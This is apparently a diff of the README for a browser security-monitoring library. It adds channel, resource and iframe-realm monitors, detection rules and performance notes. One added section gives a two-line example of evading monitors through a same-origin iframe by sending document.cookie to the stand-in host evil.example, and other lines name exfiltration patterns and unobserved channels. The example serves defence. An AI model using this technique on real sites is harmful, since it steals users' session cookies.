@@ -23,7 +23,7 @@ Guard.On("Threat", (Finding) => {
 - Zero runtime dependencies. Framework-agnostic: React, Vue, Angular, Svelte or vanilla JS.
 - Optional features ship as plugins on separate entry points: you only download what you use.
 - Safe to import during SSR (Next.js, Nuxt): it only activates in the browser.
-- Tested in real Chromium and Firefox against the published bundle.
+- Tested in real Chromium, Firefox and WebKit against the published bundle.
 
 ---
 
@@ -62,7 +62,8 @@ observe → analyze → score → report
 
 BrowserGuard:
 
-- observes `fetch`, `XMLHttpRequest`, `WebSocket`, insertion of `<script>`, `<iframe>`,
+- observes `fetch`, `XMLHttpRequest`, `WebSocket`, `sendBeacon`, `EventSource`, forms,
+  `window.open`, resource loads, service workers, insertion of `<script>`, `<iframe>`,
   `<object>` and `<embed>`, DOM XSS sinks (`innerHTML`, `document.write`, ...), CSP violations,
   native prototypes and critical runtime functions;
 - analyzes those events with specialized detectors;
@@ -207,6 +208,8 @@ interface BrowserGuardConfig {
     Prototype?: boolean;
     Runtime?: boolean; // integrity of critical functions
     Sinks?: boolean; // DOM XSS sinks: innerHTML, document.write, setTimeout("..."), ...
+    Channels?: boolean; // sendBeacon, EventSource, window.open, forms, resources, service workers
+    Realms?: boolean; // extend monitoring into same-origin iframes
   };
 
   Network?: {
@@ -265,19 +268,21 @@ the default mode; the threshold in parentheses applies if you choose `Console: "
 
 Monitors **only observe and emit events**; they never decide whether something is an attack.
 
-| Monitor              | Observes                                                                                                                                                                                                                                   | Records                                                                                                                                  |
-| -------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------- |
-| `FetchMonitor`       | `window.fetch`                                                                                                                                                                                                                             | sanitized URL, method, origin, timestamp, stack                                                                                          |
-| `XhrMonitor`         | `XMLHttpRequest.prototype.open` / `send`                                                                                                                                                                                                   | method, sanitized URL, origin, timestamp, stack (on send)                                                                                |
-| `WebSocketMonitor`   | `new WebSocket()`                                                                                                                                                                                                                          | sanitized URL, origin, protocols, stack. Messages are not inspected.                                                                     |
-| `DomMonitor`         | `MutationObserver` (childList + subtree)                                                                                                                                                                                                   | inserted `script`, `iframe`, `object`, `embed`: `src`, `type`, `async`, `defer`, `integrity`, `crossOrigin`; for inline, only the length |
-| DOM XSS sinks        | A cheap prefilter skips harmless writes without running the detailed analysis, capturing a stack or reading `location`. Measured overhead per harmless call (Chrome / Firefox): `innerHTML` +0.5 / +0.7 µs, `setAttribute` +0.2 / +0.3 µs. |
-| `CspMonitor`         | `securitypolicyviolation` event                                                                                                                                                                                                            | `blockedURI`, `violatedDirective`, `effectiveDirective`, `sourceFile`, `lineNumber`, `columnNumber`, `disposition`                       |
-| `PrototypeMonitor`   | `Object`, `Array`, `Function`, `String`, `Promise` `.prototype`                                                                                                                                                                            | added, removed or modified property descriptors                                                                                          |
-| `RuntimeMonitor`     | `fetch`, `XHR.open/send`, `WebSocket`, `setTimeout`, `setInterval`, `eval`, `Function`, `Element.prototype.appendChild/setAttribute`, `Function.prototype.toString`                                                                        | replacement, removal or tampering before start                                                                                           |
-| `SinkMonitor`        | `innerHTML`/`outerHTML` setters, `insertAdjacentHTML`, `document.write`, `createContextualFragment`, `srcdoc`, `setAttribute`, `setTimeout`/`setInterval` with a string                                                                    | sink, element, length and indicator names (never the content), stack                                                                     |
-| `AutomationMonitor`  | automation and environment traces (only with `AntiScraping`)                                                                                                                                                                               | signal names, never values                                                                                                               |
-| `InteractionMonitor` | mouse, keyboard, scroll, touch (only with `AntiScraping`)                                                                                                                                                                                  | counters per event type and synthetic events; never keys or coordinates                                                                  |
+| Monitor              | Observes                                                                                                                                                                                                                                | Records                                                                                                                                  |
+| -------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------- |
+| `FetchMonitor`       | `window.fetch`                                                                                                                                                                                                                          | sanitized URL, method, origin, timestamp, stack                                                                                          |
+| `XhrMonitor`         | `XMLHttpRequest.prototype.open` / `send`                                                                                                                                                                                                | method, sanitized URL, origin, timestamp, stack (on send)                                                                                |
+| `WebSocketMonitor`   | `new WebSocket()`                                                                                                                                                                                                                       | sanitized URL, origin, protocols, stack. Messages are not inspected.                                                                     |
+| `DomMonitor`         | `MutationObserver` (childList + subtree)                                                                                                                                                                                                | inserted `script`, `iframe`, `object`, `embed`: `src`, `type`, `async`, `defer`, `integrity`, `crossOrigin`; for inline, only the length |
+| `CspMonitor`         | `securitypolicyviolation` event                                                                                                                                                                                                         | `blockedURI`, `violatedDirective`, `effectiveDirective`, `sourceFile`, `lineNumber`, `columnNumber`, `disposition`                       |
+| `PrototypeMonitor`   | `Object`, `Array`, `Function`, `String`, `Promise` `.prototype`                                                                                                                                                                         | added, removed or modified property descriptors                                                                                          |
+| `RuntimeMonitor`     | `fetch`, `XHR.open/send`, `WebSocket`, `setTimeout`, `setInterval`, `eval`, `Function`, `Element.prototype.appendChild/setAttribute`, `Function.prototype.toString`                                                                     | replacement, removal or tampering before start                                                                                           |
+| `SinkMonitor`        | `innerHTML`/`outerHTML` setters, `insertAdjacentHTML`, `document.write`, `createContextualFragment`, `srcdoc`, `setAttribute`, URL properties (`href`, `src`, `action`, `formAction`, `data`), `setTimeout`/`setInterval` with a string | sink, element, length and indicator names (never the content), stack                                                                     |
+| `ChannelMonitor`     | `navigator.sendBeacon`, `new EventSource()`, `window.open`, form submissions (`submit` event and `form.submit()`), `serviceWorker.register`                                                                                             | destination (sanitized URL, origin, query length) and method; never bodies or form fields; stack                                         |
+| `ResourceMonitor`    | resource downloads via `PerformanceObserver` (images, CSS, fonts, media, frames)                                                                                                                                                        | sanitized URL, origin, query length, initiator type                                                                                      |
+| `RealmMonitor`       | `contentWindow` / `contentDocument` of same-origin iframes, and inserted iframes                                                                                                                                                        | installs the network, channel and sink monitors in the frame's realm; reports the access                                                 |
+| `AutomationMonitor`  | automation and environment traces (only with `AntiScraping`)                                                                                                                                                                            | signal names, never values                                                                                                               |
+| `InteractionMonitor` | mouse, keyboard, scroll, touch (only with `AntiScraping`)                                                                                                                                                                               | counters per event type and synthetic events; never keys or coordinates                                                                  |
 
 **Transparent interception.** `fetch`, `XHR` and `WebSocket` are intercepted with a `Proxy`,
 which preserves arguments, `this`, the Promise, the return value, errors, `name`, `length`,
@@ -302,13 +307,21 @@ signal weights, clamps the result to 0-100 and maps it to a severity:
 
 ### NetworkDetector
 
-| Destination                                         | Result                                     |
-| --------------------------------------------------- | ------------------------------------------ |
-| same-origin (includes `ws://`/`wss://` to the host) | normal, no finding                         |
-| `AllowedOrigins`                                    | normal, no finding                         |
-| unknown external origin                             | **medium** (45; WebSocket 55)              |
-| unencrypted connection from an `https` page         | +15 → **high**                             |
-| `BlockedOrigins`                                    | **critical** (takes precedence over allow) |
+| Destination                                                | Result                                     |
+| ---------------------------------------------------------- | ------------------------------------------ |
+| same-origin (includes `ws://`/`wss://` to the host)        | normal, no finding                         |
+| `AllowedOrigins`                                           | normal, no finding                         |
+| unknown external origin                                    | **medium** (45; WebSocket 55)              |
+| unencrypted connection from an `https` page                | +15 → **high**                             |
+| passive resource (image, CSS, font) from an unknown origin | **low** (25) — external CDNs are common    |
+| query string of 64+ characters to an unknown origin        | +25 (exfiltration pattern: `?c=<cookies>`) |
+| service worker registration                                | **low** (persistence capability)           |
+| `BlockedOrigins`                                           | **critical** (takes precedence over allow) |
+
+The same rules apply to every channel: `fetch`, XHR, WebSocket, `sendBeacon`, `EventSource`,
+form submissions, `window.open` and resource loads. Only the query **length** is recorded,
+never its content. Equivalent findings (same channel, origin and signals) are grouped for
+10 seconds, so a gallery of 200 external images produces one finding.
 
 ### ScriptInjectionDetector
 
@@ -341,13 +354,14 @@ when a native function is replaced or removed. Example: `Object.prototype.pollut
 
 ### RuntimeIntegrityDetector
 
-| Situation                                                                     | Result   |
-| ----------------------------------------------------------------------------- | -------- |
-| replaced by something that looks native (Proxy, `bind`)                       | medium   |
-| replaced by a non-native function                                             | high     |
-| non-native replacement of `eval`, `Function` or `Function.prototype.toString` | critical |
-| function already modified when BrowserGuard started                           | medium   |
-| function removed                                                              | medium   |
+| Situation                                                                          | Result   |
+| ---------------------------------------------------------------------------------- | -------- |
+| replaced by something that looks native (Proxy, `bind`)                            | medium   |
+| replaced by a non-native function                                                  | high     |
+| non-native replacement of `eval`, `Function` or `Function.prototype.toString`      | critical |
+| function already modified when BrowserGuard started                                | medium   |
+| function removed                                                                   | medium   |
+| script accessed the realm of a same-origin iframe (monitoring is extended into it) | low      |
 
 `NativeFunctionUtils` does not rely on `Function.prototype.toString()` alone: it combines the
 source obtained through a **captured** `toString` reference (immune to later replacement), the
@@ -389,6 +403,22 @@ history.
 > application. Their use is still visible through CSP `unsafe-eval` violations and
 > `RuntimeMonitor`; full coverage is planned with Trusted Types (v0.3).
 
+### Same-origin iframes (evasion through a clean realm)
+
+Every iframe has its own `fetch`, `XMLHttpRequest`, `innerHTML`... Creating an empty iframe to get
+unmonitored copies is the most common way to evade a client-side monitor:
+
+```js
+const frame = document.body.appendChild(document.createElement("iframe"));
+frame.contentWindow.fetch("https://evil.example/?c=" + document.cookie);
+```
+
+`RealmMonitor` closes this gap: when a script reaches the realm of a same-origin iframe
+(`contentWindow`, `contentDocument`), the network, channel and sink monitors are installed in it
+**before** the value is returned, and the access is reported (low). Iframes are also protected
+when inserted, which covers later access through `window.frames[i]`. Cross-origin iframes are
+ignored: they cannot be observed, and talking to them with `postMessage` is legitimate.
+
 ### Custom weights
 
 ```ts
@@ -412,7 +442,9 @@ Available signals: `network.unknown-origin`, `network.blocked-origin`, `network.
 `runtime.modified`, `runtime.preexisting`, `runtime.removed`, `runtime.non-native`,
 `runtime.critical-target`, `xss.auto-event-handler`, `xss.event-handler`, `xss.script-tag`,
 `xss.javascript-url`, `xss.embedded-content`, `xss.sensitive-access`, `xss.probe`,
-`xss.url-reflected`, `xss.string-code`, `xss.legacy-sink`, and the `bot.*` signals listed in
+`xss.url-reflected`, `xss.string-code`, `xss.legacy-sink`, `network.unknown-resource`,
+`network.large-query`, `network.service-worker`, `runtime.realm-access`, and the `bot.*`
+signals listed in
 [Anti-scraping](#signals).
 
 ## Events
@@ -658,7 +690,7 @@ BrowserGuard.Start({
 
 | Plugin            | Entry point                                 | Adds (min+gzip) |
 | ----------------- | ------------------------------------------- | --------------- |
-| core              | `@puertochenta/browser-guard`               | 15.7 KB         |
+| core              | `@puertochenta/browser-guard`               | 18.0 KB         |
 | `AntiScraping`    | `@puertochenta/browser-guard/anti-scraping` | +4.2 KB         |
 | `RemoteReporting` | `@puertochenta/browser-guard/remote`        | +2.0 KB         |
 
@@ -915,20 +947,21 @@ interface AntiScrapingConfig {
   (for example, a script injected in the HTML) can tamper with the environment unseen;
   `RuntimeMonitor` only reports it if it leaves non-native-looking functions behind.
 - **Evasion.** An attacker with code execution in the page can, in theory, detect and disable
-  BrowserGuard, use references captured before start, or use unobserved channels
-  (`navigator.sendBeacon`, `<img>`, `<link>`, forms, `EventSource`, `WebRTC`, workers).
-  BrowserGuard increases visibility; it is not a barrier.
-- **Realms.** Only the main window is observed. Iframes and workers have their own `fetch`,
-  prototypes and DOM.
+  BrowserGuard, use references captured before start, or use channels that are still not
+  observed (`WebRTC` data channels, workers, navigation via `location`). BrowserGuard increases
+  visibility; it is not a barrier.
+- **Realms.** Same-origin iframes are protected when a script reaches them or when they are
+  inserted. A realm reached synchronously through `window.frames[i]` in the same task that
+  inserted the iframe, workers, and cross-origin frames are not observed.
 - **Proxies.** A `Proxy` over a native function reports `[native code]`; that is why replacements
   are mainly detected by reference comparison.
 - **Periodic checks.** Prototype and critical-function changes are detected on the next check
   cycle (2-5 s depending on the preset), not instantly. A change reverted before the next cycle
   can go unnoticed.
-- **DOM.** Changing the `src` of an existing script is not detected (attribute changes are not
-  observed, except through `setAttribute`). Assigning attributes as properties
-  (`img.onerror = ...`, `a.href = "javascript:..."`) is not observed either. Element insertion
-  events carry no stack trace (the `MutationObserver` callback is asynchronous); sink findings do.
+- **DOM.** Changing the `src` of an existing script is not detected. Event handlers assigned as
+  functions (`img.onerror = fn`) are not sinks and are not observed. Element insertion events and
+  resource loads carry no stack trace (they are reported asynchronously by the browser); sink and
+  channel findings do.
 - **DOM XSS.** Detection is based on indicators, not on full taint tracking: an encoded or
   transformed payload may not be recognized as reflected, and `eval` / `new Function` are not
   intercepted (see [XssSinkDetector](#xsssinkdetector-dom-xss)).
@@ -972,20 +1005,23 @@ To report a vulnerability, see [SECURITY.md](SECURITY.md).
 
 Decisions with a performance impact:
 
-| Area                                            | Decision                                                                                                                                                                               |
-| ----------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| Hot path (`fetch`, `XHR.send`, `new WebSocket`) | The hook only builds a small event and captures the stack. Detection, scoring and reporting are deferred to a microtask and processed in batches.                                      |
-| Stack traces                                    | Only at network interception points, limited to 8-16 frames. Never in high-volume callbacks.                                                                                           |
-| `MutationObserver`                              | Only `childList` + `subtree`; no `attributes` or `characterData`. A single `querySelectorAll` per inserted subtree, and only if it has children.                                       |
-| Prototypes and runtime                          | No aggressive polling: reference comparison of ~150 descriptors and 11 functions every 2-5 s, run in `requestIdleCallback` when available, chaining `setTimeout` (runs never pile up). |
-| Serialization                                   | Only finding evidence, with bounded depth, keys and length.                                                                                                                            |
-| Console                                         | Per-preset threshold and 10 s deduplication.                                                                                                                                           |
-| Bursts                                          | The event queue drops events beyond 1000 pending (`GetStatus().DroppedEvents`).                                                                                                        |
+| Area                                            | Decision                                                                                                                                                                                                                                   |
+| ----------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
+| Hot path (`fetch`, `XHR.send`, `new WebSocket`) | The hook only builds a small event and captures the stack. Detection, scoring and reporting are deferred to a microtask and processed in batches.                                                                                          |
+| Stack traces                                    | Only at network interception points, limited to 8-16 frames. Never in high-volume callbacks.                                                                                                                                               |
+| `MutationObserver`                              | Only `childList` + `subtree`; no `attributes` or `characterData`. A single `querySelectorAll` per inserted subtree, and only if it has children.                                                                                           |
+| DOM XSS sinks                                   | A cheap prefilter skips harmless writes without running the detailed analysis, capturing a stack or reading `location`. Measured overhead per harmless call (Chrome / Firefox): `innerHTML` +0.5 / +0.7 µs, `setAttribute` +0.2 / +0.3 µs. |
+| Resources                                       | `PerformanceObserver` reports downloads without patching any API; findings for equivalent destinations are grouped for 10 s.                                                                                                               |
+| Same-origin iframes                             | Monitors are installed in a frame realm only when a script reaches it (or when the frame is inserted), at most 20 realms at a time.                                                                                                        |
+| Prototypes and runtime                          | No aggressive polling: reference comparison of ~150 descriptors and 11 functions every 2-5 s, run in `requestIdleCallback` when available, chaining `setTimeout` (runs never pile up).                                                     |
+| Serialization                                   | Only finding evidence, with bounded depth, keys and length.                                                                                                                                                                                |
+| Console                                         | Per-preset threshold and 10 s deduplication.                                                                                                                                                                                               |
+| Bursts                                          | The event queue drops events beyond 1000 pending (`GetStatus().DroppedEvents`).                                                                                                                                                            |
 
 Reference measurement (Chrome, this repository's demo): the overhead per intercepted `fetch`
 call is about **50 µs**, dominated by stack trace capture; on `XMLHttpRequest.open` it is
-negligible. Bundle size for an application that imports only the core: ~49 KB minified,
-~16 KB gzip, with no dependencies; each plugin adds its own size (see [Plugins](#plugins)).
+negligible. Bundle size for an application that imports only the core: ~58 KB minified,
+~18 KB gzip, with no dependencies; each plugin adds its own size (see [Plugins](#plugins)).
 In production bundles (library and app in the same file) stack traces still point to your code:
 internal frames are dropped by position, not by file name.
 
@@ -1044,7 +1080,7 @@ pnpm lint           # eslint (typescript-eslint strict)
 pnpm test           # vitest (watch)
 pnpm test:run       # unit tests (jsdom)
 pnpm test:coverage  # coverage (80% threshold on Core and Detectors)
-pnpm test:e2e       # builds and tests dist/ in real Chromium and Firefox (Playwright)
+pnpm test:e2e       # builds and tests dist/ in real Chromium, Firefox and WebKit (Playwright)
 pnpm test:package   # packs the .tgz, installs it in a temp project and type-checks it
 pnpm format         # prettier
 ```
@@ -1065,7 +1101,7 @@ The first time, install the Playwright browsers: `pnpm exec playwright install c
   Node (SSR).
 
 **CI** (`.github/workflows/ci.yml`): formatting, lint, types, unit tests with coverage, build and
-package check on Node 22 and 24; e2e tests in Chromium and Firefox; example builds.
+package check on Node 22 and 24; e2e tests in Chromium, Firefox and WebKit; example builds.
 
 **Versioning and publishing** with [changesets](https://github.com/changesets/changesets):
 
